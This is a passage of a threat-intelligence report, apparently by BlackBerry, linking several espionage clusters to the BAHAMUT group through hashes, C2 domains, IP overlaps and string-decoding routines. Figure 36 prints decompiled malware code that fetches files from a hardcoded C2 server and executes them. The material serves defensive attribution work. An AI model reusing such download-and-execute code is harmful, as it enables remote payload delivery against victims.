“by4mode[.]com” were listed in Kaspersky’s write-up as C2 servers\nutilized in weaponized InPage documents, which BlackBerry assesses were the work of BAHAMUT.\nMatching on the unique string obfuscation technique used in the “d92” sample, BlackBerry correlated\na handful of other samples which communicated to another domain, “logstrick[.]com”. See for\nexample the following hash:\n\n19a3b044449217c86215acdd7e8036d8d2a933a1cb7f02235cb5ce68ab1153a7\n\nBlackBerry noted the “logstrick[.]com” domain was listed in the Appendix of Trend Micro’s URPAGE\nreport. This provided yet another BAHAMUT connection.\n\n\n-----\n\nThe decoding function for the strings in the sample (19a…) employed a 94-character long, custom\ncharacter substitution method. In BlackBerry’s opinion, the likelihood of someone else co-opting\nthis particularly unique obfuscation method is low.\n\n```\ndef decode(s):\n  substitution_cipher = {\n     'u': '{', '^': 'R', 'v': '%', 'P': '#',\n     'E': 'a', '#': 'i', 'H': 'n', '=': '~',\n     'T': 'Q', '$': '(', '\\\\': '3', '&': 'B',\n     '?': '.', 'y': '\"', 'Z': 'J', '@': '<',\n     '(': 'd', '<': 'A', 'G': 'U', 'w': '}',\n     ']': 'p', '{': ':', 'R': '6', '2': 'r',\n     '\"': '1', 'j': 'Z', '.': 'k', 'V': '*',\n     'M': 'j', 'N': '=', 'J': '[', 'W': 'K',\n     'q': ';', 'C': 'm', 'U': 'b', '|': 'H',\n     'A': 'D', 'x': '^', '6': 's', 'L': '5',\n     'X': 'S', 'z': 'M', '/': '7', 'D': '?',\n     '~': 'x', ',': '8', '1': 'L', 't': '2',\n     '*': 'f', '0': '>', 'B': 'V', '8': 'X',\n     '}': 't', 'Q': '0', 'O': '@', 'l': '\\\\',\n     'm': '4', '-': 'v', '`': 'G', 'h': 'I',\n     '%': 'F', 'e': 'P', '!': ',', 'g': 'e',\n     'Y': 'q', '_': '-', 'S': 'c', 'I': 'g',\n     'p': 'E', ')': 'O', '7': 'W', 'c': 'z',\n     '[': '+', ' ': 'l', 'd': '`', 'a': '$',\n     'n': 'y', '4': 'N', '3': '_', 'b': 'w',\n     'f': 'T', 'o': '&', '+': '!', 's': 'u',\n     ';': '9', 'k': ' ', ':': ']', '>': 'Y',\n     'r': ')', 'K': '|', 'F': 'o', '9': '/',\n     '5': 'h', 'i': 'C',\n  }\n\n```\n**return** `''.join([substitution_cipher[c] for c in s])`\n\n\n_Figure 34: Python function to decode the substitution cipher used in 19a3..._\n\nThe only other public mention BlackBerry identified with regard to the group using a substitution\ncipher was in a Palo Alto report on InPage from 2017 (Soo & Grunzweig, 2017). This provides yet\nanother precise tie-in to BAHAMUT.\n\n**Gazing Into the Abyss – Trend Micro’s URPAGE**\n\nAs we mentioned previously and referenced above, Trend Micro’s detailed URPAGE whitepaper\nwas released in August of 2018. The paper provided a glimpse into BAHAMUT’s much larger\nset of operations. The report spanned nearly five years’ worth of malware samples. Utilizing an\ninfographic, Trend Micro considered evidence that suggested BAHAMUT, CONFUCIUS, URPAGE,\nand PATCHWORK were all connected. BlackBerry originally decided to focus on the common\nlinkage provided specifically by the “BioData” Delphi backdoors and Android malware. Below you’ll\nfind the original Trend Micro infographic which we modified and reduced to the following relevant\nconnections:\n\n\n-----\n\nWe have already provided evidence suggesting strong links between the Android and BioData\nsamples in the Bellingcat, WINDSHIFT, and Kaspersky InPage sections above.\n\nNext, we inspected the InPage documents referenced in the Trend Micro report, which suggested\na connection between URPAGE and CONFUCIUS. BlackBerry also took a more in-depth look at\n“BioData,” specifically its correlation to the PATCHWORK group as first described by Norman in\nOPERATION HANGOVER (Fagerland, 2013). BlackBerry also referenced a later presentation by Trend\nMicro researchers, which provided additional details on the methods the researchers employed\nto reach their crossover conclusions (Lunghi & Horejsi, Linking cyberespionage groups targeting\nvictims in South Asia, 2019).\n\n**xldbszcd???**\n\nBlackBerry started with samples containing the string “xldbszcd”, which Trend Micro used to link\nHANGOVER, CONFUCIUS, and URPAGE together. BlackBerry identified the following hashes in our\ncollection containing this string:\n\n_Backdoors_\n\n1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a\n\ncf2b71cb187010c28ccfee8fe17a69808b2bbb327eb9a6fc9fa345a8ebe904cf\n\n_File Stealers_\n\n3e7c61dd4b4dc702f59b16d92fe5a67f4ba5cfdb7d8bb2c4bee888aeca95abcc\n\n472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55\n\nbe76f24280919f1cb952c9996bc927e6e485123839ba84bbadc8fb9eb885c354\n\ncaade5a1d0004d64e874aae9955725f43062896f64f51b29f559c3992828bc31\n\ncca74bb322ad7833a21209b1418c9837e30983daec30d199a839f46075ee72f2\n\nBlackBerry confirmed “1f0d…” was a BAHAMUT-related file that communicated to the domain\n“ambicluster[.]com”, which was previously identified and disclosed by Kaspersky. BlackBerry further\nanalyzed exactly how the string “xldbszcd” was recycled in this and the other binaries. We found\nthe string was used to seed a decoding function that used it to derive an 8-byte XOR key which\ncould be used to unencode strings in the samples. Several of the strings in the files with network\nconnectivity were additionally hex-encoded, although the function below could be readily used to\ndecode these as well:\n\n\n-----\n\n**def** xldbszcd_xor(s):\nout = ''\nkey = ''\nk = 0\n**for b in** 'xldbszcd':\nkey+=chr(ord(b)&0x1F)\n**for i in s:**\n**if k ==** len(key):\nk = 0\nout += chr(ord(i) ^ ord(key[k]))\nk += 1\n**return out**\n\n\n_Figure 35: Python snippet to decode strings from samples listed above_\n\nThe binary beginning “cf2b” was another BAHAMUT backdoor that communicated to the domain\n“classmunch[.]com”, which first appeared in Trend Micro’s 2018 URPAGE writeup.\n\nThe file beginning “472e” appeared to match what Trend Micro previously described in their\nCONFUCIUS whitepaper (Lunghi & Horejsi, Confucius Update: New Tools and Techniques, Further\nConnections with Patchwork, 2018) as the “usctrls stealer”. The program copied files from removable\nmedia to the file “%AppData%\\OffLogs\\items.log” if any of the files ended with one of the following\nextensions: “.pdf”, “.doc”, “.docx”, “.xls”, “.xlsx”, “.ppt”, or “.pptx”. Most of the other binaries employed\nthe same persistence method using the same file path as “1f0d” via an LNK file in the Windows\nStartup Folder named “protector.lnk” and had similar functionality to “472e”.\n\nOne of the files was a bit different from the rest. The hash beginning “cca7” had an additional\nobfuscation method in it which used the seed value “cwboeays” toward the same custom XOR\nfunction. The binary enumerated several extra filetypes including “inp”, “rtf”, “txt”, and “kmz” files.\nKMZ was an especially interesting filetype to enumerate and exfiltrate, as these files would likely\ncontain compressed Keyhole Markup Language data. This data can either be displayed directly in\nmaps or inside of other geospatial software that implements KML encoding. This was a somewhat\nrare find in our experiences with malware.\n\nAfter reviewing this particular finding, BlackBerry now questions Trend Micro’s assessment that\nthe string “xldbszcd” was a high-fidelity indicator linking the groups together. It was possible the\ngroups may have shared a document stealer. However, the C2 infrastructure that BAHAMUT used\nappeared to be isolated and completely separate from the infrastructure of the other groups.\nSamples connected to CONFUCIUS also did not appear to communicate to any external addresses.\n\n\n-----\n\n**Another Link in the Chain? – HANGOVER**\n\nBlackBerry identified several cases of IP crossover between BAHAMUT C2 domains and C2 domains\nboth previously disclosed and as yet undisclosed that were associated with another group called\nHANGOVER. For example, the domain “similerwork[.]net” resolved to the IP address “31.210.96[.]222”\nfrom August 11, 2013 to November 6, 2013. This particular domain was mentioned in numerous\nHANGOVER write-ups from 2013 (Blasco, 2013) (OpenDNS Security Research, 2013). BlackBerry\nlocated a sample that used an identical C2 protocol to samples described in the aforementioned\nHANGOVER reports. BlackBerry then located an additional BAHAMUT backdoor that communicated\nto the domain “traxbin[.]com”, which resolved to the same IP address from January 31, 2017 to\nJanuary 28, 2018. Indeed, BlackBerry identified several instances of similar BAHAMUT / HANGOVER\nIP-related crossover as summarized below:\n\n**_Crossover IP address: 31.210.96[.]222_**\n\n_Resolution Window “similerwork[.]net”: 8/11/2013 – 11/6/2013_\n_HANGOVER Sample: 9005bede88a85ebe90960fca54eff7d69e7fb0fb45944a4eb49ffb65f565f2c3_\n\n_Resolution Window “traxbin[.]com”: 1/31/2017 – 1/28/2018_\n_BAHAMUT Sample:_\nad41a8e1967987d260c2ca8ae392e6735f1a61ab0304d86454fadd2e992d8aa3\n\n**_Crossover IP Address: 31.210.96[.]220_**\n\n_Resolution Window “maptonote[.]com”: 9/9/2013-11/6/2013_\n_HANGOVER Sample:_\n0caaf92b928446e8705587744951568d96fa68d7bf4a9988ea9e98cf6ffb44f3\n\n_Resolution Window “redopro[.]com”: 12/13/2016 – 12/19/2017_\n_BAHAMUT Sample:_\n816a272e95f223eaf31e8830e054e0711cb868684c0d0569a52c2abfd0ad28bb\n\n**_Crossover IP Address:_** **_31.210.96[.]213_**\n\n_Resolution Window “myflatnet[.]com”: 9/25/2013 – 11/6/2013_\n_HANGOVER Sample:_\n64023272dc7bc0c97123a6b41e3db3af179826e01457709e76e048b1a93185b4\n\n_Resolution Window “source4z[.]com”: 6/6/2015 – 10/30/2015_\n_Downloaded BAHAMUT Sample:_\n2af07c7cee0743b9ab84eb5947d0334cb0b1dc874fa562920aafbc4ad95b12fc\n\n\n-----\n\nIt’s important to note here that in each case of IP overlap there was a significant time gap of multiple\nyears between HANGOVER activity and BAHAMUT activity. Similarly, numerous other unrelated\ndomains resolved to those IP addresses within those interim gap periods, indicating the servers\nor VPS providers had likely changed ownership one or more times. Therefore, despite rampant\nspeculation in the published research around HANGOVER and BAHAMUT connections, it should\nbe remembered that attribution is also a function of time and, most importantly, correlation is not\ncausation. BlackBerry found only circumstantial and tenuous evidence to suggest direct linkage\nvia IP crossover alone. As such, BlackBerry does not believe BAHAMUT in its current form was\nrelated to previously documented HANGOVER activity based upon these associations. BlackBerry\nassesses with high confidence that it was more likely both groups purchased/rented a block of IP\naddresses from the same common provider.\n\n**EHDEVEL — Eh?**\n\nThe Trend Micro URPAGE report also attempted to make connections to EHDEVEL via the\nfollowing sample:\n\n5bebe3986c2dcb5f50ea5d34c564c24ad3bbc132e648f1d009757a0d69c87e52\n\nThis sample was an SFX archive that dropped both a BAHAMUT (BioData) backdoor and a compiled\nPython executable associated with EHDEVEL. The SFX script was as follows.\n\nPath=%userprofile%\n\nSetup=inetsrvce.exe\n\nSetup=winitst.exe\n\nSilent=1\n\nOverwrite=1\n\nUpdate=U\n\nThe file dropped to “%userprofile%/inetsrvce.exe” was a BAHAMUT backdoor that communicated\nto “scan8t[.]com” while the file dropped to “%userprofile%winitst.exe” was a compiled Python\nexecutable. Their hashes were\n\ninetsrvce.exe 184446BCB17021C39128369E9FE3D06CD0DDE430C7F2E90C945C5A3299\n\nEF7B52\n\nwinitst.exe 1E8CB07AE43AA1AA75B73D43DCE6A0AE3FEFCE8823BD3C3B19F6F\n\nDCD9E7C9B37\n\nAgain, BlackBerry held in mind that correlation and causation are two separate things, and proceeded\nwith the notion that this could very well have been another instance. Anyone could have created an\nSFX archive containing two separate backdoors. BAHAMUT is an actor that has been previously\nobserved going to great lengths to provide false leads and misdirect investigations, in part by\ndropping previously known samples associated with other threat groups. So BlackBerry inspected\nthe details of each binary a little more closely:\n\nSFX Archive Compile Time: February 15, 2015 8:00:31 UTC\n\nwinitst.exe Compile Time: Mar 23, 2013 22:26:55 UTC\n\ninetsrvce.exe Compile Time: ???\n\n\n-----\n\nTypically, the resource directory of Delphi executables can be used to gain an approximate compile\ntime for the sample. But in this case, these values were either modified or forged. Given the sample’s\nsubmission to a common malware repository in March of 2015, BlackBerry assumed the SFX archive\ncompile time was likely accurate. The compiled Python executable was created with “Pyinstaller”\nand some of the uncompressed sizes were modified so public scripts would fail without slight\nmodifications. The compiled Python could still be trivially decompiled to source.\n\n\n**def** dnd(na,hname,dir2):\n**if na ==** 1:\nfiles = urlopen('http://95.211.189.56/infile02.php').read()\n**else:**\nfiles =\nurlopen(\"http://95.211.189.56/livecasting.php?sysname=%s\"%(hname)).read()\nffile10 = glob(dir2+\"*\")\n**for f in files.split(';'):**\n**try:**\n**if** **not (dir2+f in ffile10) or (f.find('.txt')** <> -1):\nfiles1 =\nurlopen('http://95.211.189.56/appmarket02/%s'%(f)).read()\nrfile = dir2+f\nf = open(rfile,\"wb\")\nf.write(files1)\nf.close()\np = check_call([rfile], shell = True)\n**except** **Exception,c:**\n**print c**\n**continue**\n\n\n_Figure 36: Decompiled Python snippet related to EHDEVEL_\n\nThe sample above communicated with the IP address “95.211.189[.]56” which, BlackBerry found\nwas mentioned in a “Cyber Espionage Advisory” from the Government of Pakistan (Pakistan\nGovernment, 2016).\n\nGiven that a security researcher could decompile a script to source, BlackBerry questioned why\nan attacker couldn’t also reuse the same code. Most of the other samples BlackBerry identified\nwhich communicated to the IP were more closely related to HANGOVER than EHDEVEL, with a\nsingle exception:\n\n4c37ee05dd6858f52e86676721c65ab4f942d365bb19c75158fd3f227c435895\n\nThis sample was explicitly listed in the Appendix of Bitdefender’s 2017 EHDEVEL paper, (Maximciuc\n& Vatamanu, 2017). BlackBerry confirmed this particular finding which actually linked HANGOVER,\nEHDEVEL, and BAHAMUT together. The compilation date for that sample was also at least one year\nprior to anyone publicly disclosing the IP address “95.211.189[.]56”. BlackBerry therefore assesses\nwith high confidence that EHDEVEL is either a direct side-project of the BAHAMUT group or uses\none or more common development resources.\n\n\n-----\n\n###### Will-o’-the-WHITE-COMPANY?\n\nNear the end of 2018, Cylance (which was acquired by BlackBerry in 2019) released research on\na threat group called THE WHITE COMPANY whose targets included the Pakistani military and\ngovernment (Livelli, Smith, & Gross, 2018). Building upon the considerably detailed analysis of the\nparticularities of the exploits explored in Part 2 of that report, BlackBerry identified what appeared\nto be a later version of the same exploit, likely developed by the same set of authors, or at the very\nleast, sourced from the same exploit broker. The specific hash in question was:\n\nceee2b4db522a3d4bc56d847e39fded427ee346b462250307bb34ca44aff0cb1\n\nThis document extracted, decoded, and executed a payload from within itself exactly as previously\ndescribed by Cylance. This payload had the following SHA256:\n\nc1ae6df1da890afdd746937573727606dc4c74087f99f7f6a5281f20d6bc7031\n\nLike other BAHAMUT backdoors, it was programmed in Visual Basic 6. BlackBerry immediately\nnoticed some string similarities to the earlier described method, which reversed strings containing\nthe names of antivirus products and separated the characters with the “@” symbol. This provided\nan immediate direct link to Cisco Talos’ work, Kaspersky’s InPage work, and Trend Micro’s URPAGE\nwork, all of which BlackBerry assesses are attributable to BAHAMUT. Upon digging into the sample\nfurther, we found it utilized a 94-character string substitution cipher. Although the cipher itself was\ndifferent, the string length of 94 characters was somewhat peculiar and it aligned with the previously\nanalyzed samples. BlackBerry created the following script to decode these obfuscated strings from\nthe aforementioned sample:\n\n\n**import binascii**\n\n**def** `decode(s):`\n```\n     start =\nbinascii.unhexlify(b'43595b6d3045553f5d4d516753342a586c4144794b7c7e69243e2c74\n7a487123603d576e73376b77314e63472b5c49322878407526643665466f35725e4f3829397b6\n85221253a70662f7d4c562e272d4a76425054616a333c625a3b5f20').decode('utf-8')\n     finish =\nbinascii.unhexlify(b'7B2B317E5F337D675E24517526704C2144384A52202839582E3A7923\n7141744F552F72764B345666472D6A54486E5D27613F6429353D4330592C60637C7A5A4D6C5C3\nB73253C6B453765404E68494662323E5736772A695B6F78506D5342').decode('utf-8')\n     translation_table = str.maketrans(start,finish)\n\n```\n**return s.translate(translation_table)**\n\n\n_Figure 37: Python Script to Decode Strings from Binary Beginning “c1ae6”_\n\n\n-----\n\nThis particular sample communicated to the domain, “frexinq[.]com”. BlackBerry was unable to\nfind any specific mentions of the domain elsewhere. However, based upon historical passive\nDNS data, it appeared to be a short-lived Windows C2 that was operational from June 23, 2017 to\nSeptember 18, 2017. The domain resolved to the IP address “185.15.208[.]64”, to which the domain\n“ns1.electrobric[.]com” also resolved to for approximately five months earlier that year. This was\ninteresting because the domain “electrobric[.]com” was used for Android C2 by a couple of different\nsamples mentioned in Trend Micro’s URPAGE writeup, which BlackBerry assesses to be the work of\nBAHAMUT. This indicates some amount of C2 overlap even though there was a time gap of about\ntwo months between activity sets.\n\nThese connections provided some high-confidence links that THE WHITE COMPANY and BAHAMUT\nare actually the same threat group. An alternative theory is that both THE WHITE COMPANY and\nBAHAMUT source their exploits from the same broker. However, BlackBerry does not believe this to\nhave been the case given the matching, unique shellcode similarities identified in the documents.\n\nBuilding upon those unique shellcode similarities, BlackBerry explored in detail a handful of exploits\npreviously associated with the CONFUCIUS threat actor.\n\n**Document ID** **SHA256**\n\nDID-001 4c6f74a274ea7255a178650a656c1d84c6d717043301917ffbf31285059bbd87\n\nDID-002 6b2bd1445ba96faa28f901bcc62b7e882af79a9a917e680a7259fbf47a36adf7\n\nDID-003 391fdbe672177aeff9e5413036e59bec6a21d5552f07756478132105dff7da62\n\nDID-004 617ffcc9acffe218ad546a60311d87e5acfeb288bb997ec5c55586df8d496986\n\nDID-005 ceee2b4db522a3d4bc56d847e39fded427ee346b462250307bb34ca44aff0cb1\n\n_Table 9: Exploit documents associated with CONFUCIUS_\n\n**Document ID** **Stage 2 MD5 Hash**\n\nDID-001 b1f5dbc3acce36d5cc6e8f9905c5f165\n\nDID-002 e507e9f333a8408731b88362404b7fdd\n\nDID-003 b3c7dc912dfb1fe43db617e48c1026f2\n\nDID-004 b3c7dc912dfb1fe43db617e48c1026f2\n\nDID-005 697eba95c17a9c153716397aa153d6f0\n\n_Table 10: 2nd Stage hash values_\n\n\n-----\n\n_Table 11: Antivirus evasions included in each Exploit Document_\n\nAll of the RTF documents appeared to use shellcode written by the same authors as the shellcode\ndocumented within THE WHITE COMPANY whitepaper. DID-001 and DID-005 exploited the Smart Tag\nvulnerability as documented within Operation Shaheen (Livelli, Smith, & Gross, 2018). Additionally,\nthese documents were perfect matches for various evolutionary states of the shellcode. DID-001\nmatched stage1_version2 and stage2_version2. DID-005 matched stage1_version3 and stage2_\nversion4. The remaining documents, DID-002, DID-003, and DID-004 directly shared variable portions\nof shellcode with Operation Shaheen. It is unlikely, given the quantity of code overlap, that these\nexploit documents were authored by different developers. BlackBerry therefore assesses with\nhigh confidence that the exploit documents associated with CONFUCIUS represent a previously\nundocumented evolutionary step within the Operation Shaheen exploit tree, as described in Part 2\nof the Cylance report, “Exploits Evolved.” Indeed, this leads us to strongly link THE WHITE COMPANY\nwith the threat actor known as CONFUCIUS.\n\nIn the Technical Appendix, BlackBerry explore all of the direct matches to the meticulously\ndocumented shellcode from Operation Shaheen.\n\n###### Wrapping Arms Around the Bahamut\n\nIn sum, BlackBerry assesses with high confidence that the following groups were in fact all the\nsame behemoth of an attack group – BAHAMUT:\n\n1. Kaspersky’s unnamed “InPage” threat actor\n\n2. The BAHAMUT group first described and named by Bellingcat\n\n3. The unnamed group described in Cisco Talos’ MDM blog posts\n\n4. DarkMatter’s WINDSHIFT\n\n5. Trend Micro’s URPAGE\n\n6. Cylance’s THE WHITE COMPANY\n\nAs the parable goes, depending on where you’re standing around an elephant, it can look very\ndifferent. BlackBerry posits that given the limited views each organization had at the time their\nresearch was written, they made the best assessments they could. Threat intelligence has always\nbeen a discipline fraught with traps, and BAHAMUT is exceptionally good at placing them.\n\n\n-----\n\n# conclusion\n\nFor a group that historically set themselves apart by employing above-average\noperational security and extremely skilled technical capabilities, BAHAMUT\noperators are, at the end of the day, still human. While their mistakes have\nbeen few, they have also proven devastating. BlackBerry found that the idiom\n“old habits die hard” applies to even the most advanced of threat groups.\n\nOperational security will become increasingly important as more and more\nintelligence functions are outsourced by governments, corporations, and\nprivate individuals to groups like BAHAMUT. For, while these third parties\nadd a layer of plausible deniability for those who employ them, they also\nintroduce additional weaknesses that are not always immediately obvious.\n\nIn this report, BlackBerry was able to tie together a series of complex\nconnections and seemingly disparate industry analyses and attribute them\nto a single actor.\n\nThe ever-expanding story of cyberespionage will undoubtedly continue\nwell past our own lifetimes and is sure to define new norms in international\nrelations. But as the new chapters in that story are written, the lessons and\nwarnings of the past should not be forgotten. Jorge Luis Borges reminded\nus of one of them in his description of the Bahamut in The Book of Imaginary\n_Beings. Quoting Edward Lane’s Arabian Society in the Middle Ages, he noted_\nthat God created the Bahamut to support the earth. And God placed water\nunder the Bahamut for support, and under the water, darkness. But, he wrote,\n“the knowledge of mankind fails as to what is under the darkness” (Borges,\n1967). Even when mercenary groups appear to surface briefly in security\nresearch, their true sponsors may forever remain in the dark.\n\n\n-----\n\n### Technical Appendix\n\n**SHA256 File
